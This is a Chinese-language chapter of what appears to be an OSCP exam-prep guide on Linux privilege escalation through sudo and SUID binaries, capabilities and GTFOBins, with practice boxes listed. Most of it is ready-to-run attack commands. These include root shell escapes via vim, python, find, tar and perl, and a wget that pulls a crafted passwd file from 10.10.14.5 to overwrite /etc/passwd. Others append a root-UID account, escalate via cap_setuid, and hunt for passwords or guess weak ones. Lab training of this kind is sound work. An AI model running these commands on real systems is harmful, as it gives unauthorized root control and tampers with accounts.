# Ch 21 — SUID / SUDO 提權：GTFOBins 活用

> 目標：找到有 SUID 設定的 binary 或 sudo 可執行的程式，用 GTFOBins 找提權方法並執行。

## GTFOBins 是什麼

**GTFOBins（gtfobins.github.io）** 是一個整理各種 Unix binary 提權技術的資料庫。

只要你有某個 binary 的 SUID 或 sudo 執行權限，GTFOBins 告訴你怎麼利用它提權。

考試必用。

## SUDO 提權

### 基本流程

```bash
# 1. 確認 sudo 權限
sudo -l

# 輸出範例：
# (root) NOPASSWD: /usr/bin/vim
# → 你可以用 root 身份，不需密碼，執行 vim

# 2. 去 GTFOBins 查 "vim"
# 3. 找到 sudo 分類的方法
# 4. 執行
```

### 常見 Sudo 提權範例

**vim / nano / vi**

```bash
# 用 vim 開 shell
sudo vim -c ':!/bin/sh'
sudo vim -c ':!bash'
# 或進入 vim 後
# :!bash
```

**python / python3**

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/python3 /path/to/script.py
```

**find**

```bash
sudo find . -exec /bin/sh \; -quit
```

**less / more**

```bash
sudo less /etc/passwd
# 進入後，輸入 !bash 或 !/bin/bash
```

**wget**

```bash
# 用 wget 覆蓋 /etc/passwd（把自製的 passwd 裡 root 密碼改成你知道的）
sudo wget http://10.10.14.5/passwd -O /etc/passwd
```

**awk**

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**perl**

```bash
sudo perl -e 'exec "/bin/bash"'
```

**nmap（舊版，OSCP 靶機有）**

```bash
# nmap 有互動模式（版本 2.x-5.x）
sudo nmap --interactive
nmap> !sh
```

**tar**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**env**

```bash
sudo env /bin/bash
```

### 有密碼的 sudo 怎麼辦

如果 `sudo -l` 顯示需要密碼，先找密碼：

```bash
# 找設定檔、歷史指令裡的密碼
grep -r "password" /home/ 2>/dev/null
cat ~/.bash_history

# 試弱密碼
sudo su
# 輸入：password, 123456, user, 靶機hostname...
```

## SUID 提權

### 找 SUID Binary

```bash
find / -perm -4000 -type f 2>/dev/null
```

輸出範例：

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/screen-4.5.0      ← 舊版本，可能有漏洞
/usr/local/bin/nmap        ← 非標準位置，可疑
/usr/sbin/exim4            ← Mail server，有已知漏洞
```

正常系統的 SUID binary（不需要管）：
```
/usr/bin/passwd, /usr/bin/sudo, /usr/bin/mount, /usr/bin/newgrp...
```

**可疑的**：
- 放在非標準路徑（`/usr/local/bin/`, `/opt/`）
- 不常見的 binary（`python`, `perl`, `vim`, `find`, `nmap`）
- 有版本號在名字裡（`screen-4.5.0`）

### SUID 提權範例

**bash（SUID 設定，OSCP 靶機偶爾出現）**

```bash
# 有 SUID 的 bash
/bin/bash -p    # -p 保留 SUID 身份（不然會 drop privilege）
# 成功的話 id 會顯示 euid=0(root)
```

**python（SUID）**

```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

**find（SUID）**

```bash
find / -exec /bin/bash -p \; -quit
```

**vim（SUID）**

```bash
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

**cp（SUID）— 複製 /etc/passwd**

```bash
# 製作含有已知 root 密碼的 passwd
echo "root2:$(openssl passwd -1 -salt abc password):0:0:root:/root:/bin/bash" >> /tmp/passwd_mod
cp /tmp/passwd_mod /etc/passwd
su root2   # 密碼是 password
```

**nmap（SUID，舊版）**

```bash
nmap --interactive
# 進入後
nmap> !sh
```

## Capabilities（Cap）

除了 SUID，Linux Capabilities 也能提權：

```bash
# 找有 capabilities 的 binary
getcap -r / 2>/dev/null

# 輸出範例：
/usr/bin/python3.9 = cap_setuid+ep
# cap_setuid = 可以設置任意 UID → 可以設為 0（root）

# 利用：
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

常見可利用的 cap：
- `cap_setuid+ep` → 設 UID 為 0
- `cap_dac_override+ep` → 繞過檔案讀寫權限（讀任何檔案）

## 自動化：Linpeas + GTFOBins

1. 跑 linPEAS，找紅色的 SUID 和 sudo 項目
2. 對每個可疑的 binary，去 GTFOBins 查
3. 試 sudo 分類（如果有 sudo 權限）或 SUID 分類

## 本章對應靶機

| 機器 | 提權方式 |
|------|---------|
| HTB Shocker | sudo perl |
| HTB Bashed | sudo python3 |
| HTB Nibbles | sudo nibbleblog script |
| THM SUID Privesc | 專門練習 |

## 自我檢核

- [ ] 能說出 5 個 GTFOBins 上的 sudo 提權範例（vim, python, find, awk, perl）
- [ ] 知道 `find -perm -4000` 找出的結果哪些是正常的，哪些可疑
- [ ] 知道 SUID bash 要用 `-p` 才能保留 root 身份
- [ ] 找到 capabilities 的指令（`getcap -r /`）

→ [Ch 22 Cron Job 濫用 + 弱檔案權限](./22-cron-weak-perms.md)
